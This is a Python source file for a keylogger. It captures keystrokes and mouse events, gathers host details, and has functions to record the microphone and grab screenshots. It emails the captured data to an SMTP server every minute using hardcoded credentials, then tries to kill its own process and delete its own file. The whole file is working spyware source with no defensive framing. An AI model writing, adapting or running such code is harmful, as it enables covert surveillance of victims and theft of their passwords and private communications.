import logging
import os
import platform
import smtplib
import socket
import threading
import wave
import pyscreenshot
import sounddevice as sd
from pynput import keyboard
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email import encoders

EMAIL_ADDRESS = "smtp@mailtrap.io"
EMAIL_PASSWORD = "0561cfcbd17be0c5dc1e8a3a1ea9f1f9"
SEND_REPORT_EVERY = 60  # in seconds

class KeyLogger:
    def __init__(self, time_interval, email, password):
        self.interval = time_interval
        self.log = "KeyLogger Started..."
        self.email = email
        self.password = password

    def appendlog(self, string):
        self.log += string

    def on_move(self, x, y):
        self.appendlog(f"Mouse moved to {x} {y}\n")

    def on_click(self, x, y, button, pressed):
        if pressed:
            self.appendlog(f"Mouse clicked at {x} {y} with {button}\n")

    def on_scroll(self, x, y, dx, dy):
        self.appendlog(f"Mouse scrolled at {x} {y}\n")

    def save_data(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == keyboard.Key.space:
                current_key = " SPACE "
            elif key == keyboard.Key.esc:
                current_key = " ESC "
            else:
                current_key = f" {str(key)} "

        self.appendlog(current_key)

    def send_mail(self, subject, message, attachment=None):
        sender = "Private Person <from@example.com>"
        receiver = "A Test User <to@example.com>"

        msg = MIMEMultipart()
        msg['From'] = sender
        msg['To'] = receiver
        msg['Subject'] = subject

        msg.attach(MIMEText(message, 'plain'))

        if attachment:
            with open(attachment, "rb") as attach_file:
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(attach_file.read())
                encoders.encode_base64(part)
                part.add_header('Content-Disposition', f'attachment; filename={os.path.basename(attachment)}')
                msg.attach(part)

        with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
            server.login(self.email, self.password)
            server.send_message(msg)

    def report(self):
        self.send_mail("Keylogger Report", self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def system_information(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        self.appendlog(f"Hostname: {hostname}\nIP: {ip}\nPlatform: {plat}\nSystem: {system}\nMachine: {machine}\n")

    def microphone(self):
        fs = 44100
        seconds = SEND_REPORT_EVERY
        filename = 'sound.wav'
        myrecording = sd.rec(int(seconds * fs), samplerate =fs, channels=1)
        sd.wait()  # Wait until recording is finished
        wave_file = wave.open(filename, 'wb')
        wave_file.setnchannels(1)  # mono
        wave_file.setsampwidth(2)  # 16 bits
        wave_file.setframerate(fs)
        wave_file.writeframes(myrecording.tobytes())
        wave_file.close()

        self.send_mail("Microphone Recording", "Attached is the microphone recording.", attachment=filename)

    def screenshot(self):
        img = pyscreenshot.grab()
        img.save('screenshot.png')
        self.send_mail("Screenshot", "Attached is the screenshot.", attachment='screenshot.png')

    def run(self):
        keyboard_listener = keyboard.Listener(on_press=self.save_data)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
        with keyboard.Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
            mouse_listener.join()

        if os.name == "nt":
            try:
                os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                print('File was closed.')
                os.remove(os.path.basename(__file__))
            except OSError:
                print('File is close.')

        else:
            try:
                os.system('pkill leafpad')
                os.chmod(os.path.basename(__file__), 0o444)  # Make file read-only
                print('File was closed.')
                os.remove(os.path.basename(__file__))
            except OSError:
                print('File is close.')

keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
keylogger.run()
